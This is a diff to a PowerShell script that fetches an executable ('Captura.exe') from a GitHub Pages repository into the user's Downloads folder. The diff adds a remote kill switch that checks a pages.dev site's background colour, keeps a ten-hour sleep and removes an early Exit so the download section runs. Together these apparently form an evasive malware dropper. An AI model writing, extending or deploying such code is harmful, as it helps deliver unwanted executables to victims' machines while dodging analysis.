@@ -1,15 +1,17 @@
 $urls = @(
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/AxInterop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Interop.WMPLib.dll",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/video.mp4",
-    "https://github.com/webntdev/webntdev.github.io/raw/main/application/WindowsFormsApp2.exe"
+    "https://github.com/webntdev/webntdev.github.io/raw/main/application/Captura.exe"
 )
 
 $filePath = Join-Path -Path $env:USERPROFILE -ChildPath "Downloads\wheiu.bz"
+$url = "https://e32rj39o4.pages.dev"
+$response = Invoke-WebRequest -Uri $url
+$backgroundColor = $response.ParsedHtml.getElementsByTagName("body").Style.backgroundColor
+
+if ($backgroundColor -eq "blue") {
+    exit
+}
 
 Start-Sleep -Seconds 36000
-
-Exit
 
 $downloadDir = [System.Environment]::ExpandEnvironmentVariables('%USERPROFILE%\Downloads')
 if (-not (Test-Path -Path $downloadDir)) {
